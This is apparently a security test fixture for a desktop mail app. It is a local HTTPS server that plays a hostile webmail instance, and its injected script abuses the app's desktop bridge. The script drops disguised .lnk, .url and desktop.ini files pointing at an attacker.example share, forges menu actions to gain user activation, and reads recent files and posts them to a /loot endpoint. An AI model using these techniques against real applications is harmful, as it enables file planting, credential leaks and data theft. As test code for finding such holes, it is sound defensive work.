// A local https server that plays an instance whose page uses window.bulwarkDesktop on its
// own, with no user behind it: it picks menu lines itself, turns the Files drive on at any
// click, hands print a PDF of its own. It answers /api/config like a webmail, so the app takes
// it as an instance. What the page gets back is recorded in `loot`. No real server, no real data.
import { createServer, type Server } from 'node:https';
import type { AddressInfo } from 'node:net';
import { generateCertificate } from '../../src/main/cert';

export type HostileMode = 'idle' | 'drive' | 'pdf' | 'menu' | 'menu-frame' | 'menu-late' | 'menu-twice' | 'menu-activation';

export interface HostileInstance {
  origin: string;
  mode: HostileMode;
  loot: { kind: string; body: unknown }[];
  close: () => void;
}

/** A one-page PDF, small and valid: what a page hands to print.preview. */
export const TINY_PDF = [
  '%PDF-1.4',
  '1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj',
  '2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj',
  '3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 200 200]>>endobj',
  'trailer<</Root 1 0 R>>',
  '%%EOF',
  '',
].join('\n');

/** The files the page drops. Fake content: the names are what matters. */
export const DROPPED = [
  { path: 'Invoice 4471.pdf.lnk', text: 'fake shortcut: a real one would start a program' },
  { path: 'Open me.url', text: '[InternetShortcut]\r\nURL=https://attacker.example/landing\r\nIconFile=\\\\attacker.example\\share\\icon.ico\r\nIconIndex=0\r\n' },
  { path: 'desktop.ini', text: '[.ShellClassInfo]\r\nIconResource=\\\\attacker.example\\share\\icon.ico,0\r\n' },
  { path: 'setup.cmd', text: '@echo this would run as the user\r\n' },
];

const PAYLOAD = `
(() => {
  const mode = document.documentElement.dataset.mode;
  const inFrame = window !== window.top;
  const d = inFrame ? window.parent.bulwarkDesktop : window.bulwarkDesktop;
  const send = (kind, body) => fetch('/loot?kind=' + encodeURIComponent(kind), { method: 'POST', body: JSON.stringify(body ?? null) });
  if (!d) { send('no-bridge', null); return; }
  send('bridge', { keys: Object.keys(d).sort() });
  // The main window's page may say it isn't locked. No app lock is set up here.
  d.os.setLocked(false);

  if (mode === 'drive') {
    const files = d.files.claim();
    const dropped = ${JSON.stringify(DROPPED)};
    let done = false;
    // Any click the user makes for any reason.
    window.addEventListener('click', async () => {
      if (done) return;
      const on = await files.drive.enable('acct-1', 'Invoices 2026');
      if (!on.ok) { send('drive-refused', on); return; }
      done = true;
      send('drive-on', { path: on.value.path, id: on.value.id });
      const written = [];
      for (const file of dropped) {
        const data = new TextEncoder().encode(file.text);
        const begun = await files.beginWrite(on.value.id, file.path, { expect: null, mtimeMs: Date.now(), size: data.byteLength });
        if (!begun.ok) { written.push({ path: file.path, error: begun.error }); continue; }
        await files.writeChunk(begun.value, data);
        const committed = await files.commitWrite(begun.value);
        written.push({ path: file.path, ok: committed.ok, error: committed.error });
      }
      send('drive-written', written);
      // No click needed for this one: Explorer opens on the folder.
      const shown = await files.showInFolder(on.value.id, '');
      send('drive-shown', shown);
    });
  }

  if (mode === 'pdf') {
    // No click. The bytes are the page's own.
    const data = new TextEncoder().encode(${JSON.stringify(TINY_PDF)});
    d.print.preview({ source: 'pdf', data, title: 'Statement' }).then((outcome) => send('pdf-outcome', outcome), (error) => send('pdf-error', String(error)));
    send('pdf-asked', { bytes: data.byteLength });
  }

  const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
  const flatten = (items, out = []) => {
    for (const item of items) {
      if (item.items) flatten(item.items, out);
      else if (item.type !== 'separator') out.push(item);
    }
    return out;
  };
  const menuLines = async () => flatten((await d.menu.bar.menus()).flatMap((menu) => menu.items));
  const listed = async () => {
    const result = await d.recentFiles.list();
    return result.ok ? { ok: true, names: result.files.map((file) => file.name) } : result;
  };

  if (mode === 'menu' || mode === 'menu-frame') {
    if (mode === 'menu-frame' && !inFrame) return;
    // No click at all: the page picks a menu line itself.
    (async () => {
      // What's enabled in the menu is the page's own word.
      d.windows.sessionReady && d.windows.sessionReady();
      d.menu.setState({ 'file.import': true, 'file.saveAs': true, 'file.uploadFiles': true, 'compose.attach': true });
      await sleep(400);
      const lines = await menuLines();
      send('menu-lines', lines.map((line) => ({ id: line.id, label: line.label, enabled: line.enabled })));
      const pick = (ids) => lines.find((line) => line.enabled && ids.includes(line.id));
      // A line that only sends the page a command: nothing the user sees happens.
      const quiet = pick(['view.zoomReset']) ?? lines.find((line) => line.enabled && String(line.id).startsWith('view.zoom'));
      // A line main also grants a user activation for, so the page can open a file picker.
      const picker = pick(['file.import', 'file.uploadFiles', 'compose.attach', 'file.saveAs']);
      send('menu-picked', { quiet: quiet && quiet.id, picker: picker && picker.id });

      const before = await d.recentFiles.list();
      send('recent-before', before.ok ? { ok: true } : before);
      if (quiet) {
        d.menu.bar.run(quiet.key, quiet.label);
        await sleep(150);
        const listed = await d.recentFiles.list();
        if (listed.ok) {
          send('recent-list', listed.files.map((file) => ({ path: file.path, name: file.name })));
          for (const file of listed.files) {
            d.menu.bar.run(quiet.key, quiet.label);
            await sleep(150);
            const got = await d.recentFiles.attach(file.id);
            if (got.ok) send('recent-file', { path: file.path, text: new TextDecoder().decode(got.file.data.slice(0, 200)) });
            else send('recent-file-refused', got);
          }
        } else {
          send('recent-list-refused', listed);
        }
      }
      if (picker && !inFrame) {
        send('activation-before', navigator.userActivation.isActive);
        d.menu.bar.run(picker.key, picker.label);
        await sleep(300);
        send('activation-after', navigator.userActivation.isActive);
        const files = d.files.claim();
        if (files && files.drive) {
          const on = await files.drive.enable('acct-menu', 'Menu drive');
          send('drive-by-menu', on.ok ? { ok: true, path: on.value.path } : on);
        }
      }
      send('menu-done', null);
    })();
  }

  if (mode === 'menu-late' && !inFrame) {
    // Zoom in: a line whose effect main can see. Run on load, then 6 s after a click, then
    // right on a click.
    (async () => {
      await sleep(400);
      const zoomIn = (await menuLines()).find((line) => line.id === 'view.zoomIn');
      if (!zoomIn) { send('menu-done', 'no zoom line'); return; }
      d.menu.bar.run(zoomIn.key, zoomIn.label);
      await sleep(300);
      send('ran-on-load', null);
      let clicks = 0;
      window.addEventListener('click', async () => {
        clicks += 1;
        if (clicks === 1) {
          await sleep(6_000);
          d.menu.bar.run(zoomIn.key, zoomIn.label);
          await sleep(300);
          send('ran-late', await listed());
        } else if (clicks === 2) {
          d.menu.bar.run(zoomIn.key, zoomIn.label);
          await sleep(300);
          send('ran-on-click', null);
        }
      });
      send('menu-ready', null);
    })();
  }

  if (mode === 'menu-twice' && !inFrame) {
    // One click, and two lines run on it, each followed by a call that wants a click.
    (async () => {
      await sleep(400);
      const quiet = (await menuLines()).find((line) => line.id === 'view.zoomReset');
      window.addEventListener('click', async () => {
        d.menu.bar.run(quiet.key, quiet.label);
        const first = await listed();
        d.menu.bar.run(quiet.key, quiet.label);
        const second = await listed();
        send('twice', { first, second });
      }, { once: true });
      send('menu-ready', null);
    })();
  }

  if (mode === 'menu-activation' && !inFrame) {
    // No input: the page says Save as and Import are enabled and runs them.
    (async () => {
      d.menu.setState({ 'file.import': true, 'file.saveAs': true });
      await sleep(400);
      const lines = await menuLines();
      const ran = {};
      for (const id of ['file.saveAs', 'file.import']) {
        const line = lines.find((candidate) => candidate.id === id && candidate.enabled);
        if (!line) { ran[id] = 'not enabled'; continue; }
        d.menu.bar.run(line.key, line.label);
        await sleep(300);
        ran[id] = navigator.userActivation.isActive;
      }
      send('activation', ran);
      send('menu-done', null);
    })();
  }
})();
`;

const page = (mode: HostileMode, frame: boolean) => `<!doctype html><html data-mode="${mode}"><head><meta charset="utf-8"><title>Mail - Bulwark</title>
<style>:root{--titlebar-right-inset:140px}html,body{margin:0;height:100%;font:15px system-ui}iframe{position:absolute;left:0;top:0;width:320px;height:320px;border:0;background:#eef}</style></head>
<body>${frame ? '<p>plugin frame</p>' : `<main style="padding:340px 24px 0"><h1>Inbox</h1><p>An ordinary-looking page.</p></main>${mode === 'menu-frame' ? '<iframe src="/frame"></iframe>' : ''}`}
<script src="/payload.js"></script></body></html>`;

export async function startHostileInstance(port: number): Promise<HostileInstance> {
  const certificate = generateCertificate('localhost');
  const state: HostileInstance = { origin: '', mode: 'idle', loot: [], close: () => {} };
  const server: Server = createServer({ key: certificate.keyPem, cert: certificate.certPem }, (req, res) => {
    const url = new URL(req.url ?? '/', 'https://localhost');
    if (url.pathname === '/api/config') {
      res.writeHead(200, { 'content-type': 'application/json' });
      res.end(JSON.stringify({ appName: 'Bulwark', jmapServerUrl: 'https://mail.attacker.example' }));
      return;
    }
    if (url.pathname === '/payload.js') {
      res.writeHead(200, { 'content-type': 'text/javascript', 'cache-control': 'no-store' });
      res.end(PAYLOAD);
      return;
    }
    if (url.pathname === '/loot') {
      const chunks: Buffer[] = [];
      req.on('data', (chunk: Buffer) => chunks.push(chunk));
      req.on('end', () => {
        let body: unknown = null;
        try {
          body = JSON.parse(Buffer.concat(chunks).toString('utf8'));
        } catch {
          // Not JSON: kept as nothing.
        }
        state.loot.push({ kind: url.searchParams.get('kind') ?? '', body });
        res.writeHead(204).end();
      });
      return;
    }
    if (url.pathname === '/' || url.pathname === '/index.html') {
      res.writeHead(200, { 'content-type': 'text/html', 'cache-control': 'no-store' });
      res.end(page(state.mode, false));
      return;
    }
    if (url.pathname === '/frame') {
      res.writeHead(200, { 'content-type': 'text/html', 'cache-control': 'no-store' });
      res.end(page(state.mode, true));
      return;
    }
    res.writeHead(404).end();
  });
  await new Promise<void>((resolve) => server.listen(port, '127.0.0.1', resolve));
  state.origin = `https://localhost:${(server.address() as AddressInfo).port}`;
  state.close = () => {
    server.close();
    server.closeAllConnections();
  };
  return state;
}
